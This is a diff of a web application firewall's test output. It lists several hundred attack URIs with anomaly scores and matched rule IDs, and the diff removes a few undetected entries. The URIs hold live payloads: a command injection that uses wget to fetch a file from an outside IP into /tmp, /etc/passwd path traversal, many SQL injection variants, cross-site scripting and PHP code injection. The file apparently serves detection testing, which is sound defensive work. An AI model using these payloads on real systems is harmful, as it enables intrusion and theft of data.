@@ -1,5 +1,5 @@
 ---------------------- Statistics of URIs analyzed------------------------
-[420] input, [115] clean, [305] attacks
+[420] input, [118] clean, [302] attacks
 --------------------------- Analysis results -----------------------------
 Packet [1]	Uri [/appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS)]	PLmin [4]	Score [20]	Nattacks [6]	[932105]	[932130]	[932150]	[932160]	[949110]	[980130]
 Packet [2]	Uri [/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1]	PLmin [4]	Score [43]	Nattacks [7]	[920270]	[930100]	[930110]	[930120]	[932160]	[949110]	[980130]
@@ -55,7 +55,6 @@ Packet [67]	Uri [/index.php?c=api&m=data2&auth={md5(SYS_KEY)}&param=action=relat
 Packet [70]	Uri [/index.php?c=api&m=data2&auth=820686a208b89d4c2f8b6f2622eff83e&param=action=cache%20name=MEMBER.1'];phpinfo();$a=['1]	PLmin [4]	Score [5]	Nattacks [3]	[933160]	[949110]	[980130]
 Packet [72]	Uri [/fiyo/apps/app_comment/controller/insert.php?send=true&name=1"%20or%20sleep(10)%20or%20"1&email=aaa@qq.com&url=11&text=11111&captcha=undefined&link=%3Fapp%3Darticle%26view%3Ditem%26id%3D184]	PLmin [4]	Score [10]	Nattacks [4]	[942100]	[942160]	[949110]	[980130]
 Packet [73]	Uri [/fiyo/dapur/index.php?app=article&view=tag&act=edit&id=79&apply_tag=Simpan&id=79&name=1%22or%221&desc=1]	PLmin [4]	Score [5]	Nattacks [3]	[942100]	[949110]	[980130]
-Packet [75]	Uri [/piwigo/admin.php?page=cat_options&section=comments?cat_true%5B%5D=7*55&falsify=%C2%BB]	PLmin [4]	Score [0]	Nattacks [0]	
 Packet [77]	Uri [/cgi-bin/HASync/hasync.cgi?debug=1&syncid=123%3Cscript%3Ealert%281%29%3C/script%3E]	PLmin [4]	Score [15]	Nattacks [5]	[941100]	[941110]	[941160]	[949110]	[980130]
 Packet [79]	Uri [/websitebaker/account/preferences.php?action=details&display_name=24444'%20union%20select%20sleep(6)%23]	PLmin [4]	Score [25]	Nattacks [7]	[942100]	[942160]	[942170]	[942190]	[942360]	[949110]	[980130]
 Packet [80]	Uri [/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE%20WHEN%20(1573=1573)%20THEN%201573%20ELSE%201573*(SELECT%201573%20FROM%20DUAL%20UNION%20SELECT%209674%20FROM%20DUAL)%20END)]	PLmin [4]	Score [15]	Nattacks [5]	[942100]	[942190]	[942270]	[949110]	[980130]
@@ -131,7 +130,6 @@ Packet [178]	Uri [/index.php?option=com_socialpinboard&view=ajaxcontrol&tmpl=com
 Packet [180]	Uri [/images//lists?cid=13%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,database(),0x7c,user(),0x7c,@@version))%20desc%20--%20]	PLmin [4]	Score [15]	Nattacks [5]	[942100]	[942140]	[942190]	[949110]	[980130]
 Packet [183]	Uri [/api/sms_check.php?param=1%27and%20extractvalue(1,concat(0x7e,user()))%23]	PLmin [4]	Score [10]	Nattacks [4]	[942100]	[942190]	[949110]	[980130]
 Packet [184]	Uri [/index.php/community/?wpfd=0&wpfob=relevancy&wpfo=desc%2c(select*from(select(sleep(20)))a)&wpfs=fff&wpfin=entire-posts]	PLmin [4]	Score [5]	Nattacks [3]	[942160]	[949110]	[980130]
-Packet [185]	Uri [/forummanage.php/action=addforum&name=1desc=1&sort=11%20or%20updatexml(1,concat(0x7e,(database())),0)&readclass=1&writeclass=1&createclass=1&overforums=1]	PLmin [4]	Score [0]	Nattacks [0]	
 Packet [187]	Uri [/?page_id=2&eventyear=2015%20AND%201=1%20)--&dateset=on&eventday=1]	PLmin [4]	Score [5]	Nattacks [3]	[942100]	[949110]	[980130]
 Packet [188]	Uri [/view.php?id=-1'%20union%20select%201,version(),3,database(),5,6#]	PLmin [4]	Score [20]	Nattacks [6]	[942100]	[942140]	[942190]	[942360]	[949110]	[980130]
 Packet [189]	Uri [/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=imgedit&imgid=1%20and%201=1&gid=1]	PLmin [4]	Score [5]	Nattacks [3]	[942100]	[949110]	[980130]
@@ -200,7 +198,6 @@ Packet [280]	Uri [/quicksearch.php?q=1%20and%201=1]	PLmin [4]	Score [5]	Nattacks
 Packet [281]	Uri [/investcalc.php?price=1&projid=1%20and%201=1]	PLmin [4]	Score [5]	Nattacks [3]	[942100]	[949110]	[980130]
 Packet [282]	Uri [/list?city=1%20and%201=1&main_search=]	PLmin [4]	Score [5]	Nattacks [3]	[942100]	[949110]	[980130]
 Packet [283]	Uri [/lawyer-list?city=1%20and%201=1&main_search=]	PLmin [4]	Score [5]	Nattacks [3]	[942100]	[949110]	[980130]
-Packet [284]	Uri [/detail/1%20and%201=1]	PLmin [4]	Score [0]	Nattacks [0]	
 Packet [285]	Uri [/exams.php?sort=1%20and%201=1]	PLmin [4]	Score [5]	Nattacks [3]	[942100]	[949110]	[980130]
 Packet [287]	Uri [/service-list?city=1%20and%201=1&main_search=]	PLmin [4]	Score [5]	Nattacks [3]	[942100]	[949110]	[980130]
 Packet [288]	Uri [/categories?subctid=1%20and%201=1::/www/categories?&mctid=1%20and%201=1]	PLmin [4]	Score [5]	Nattacks [3]	[942100]	[949110]	[980130]
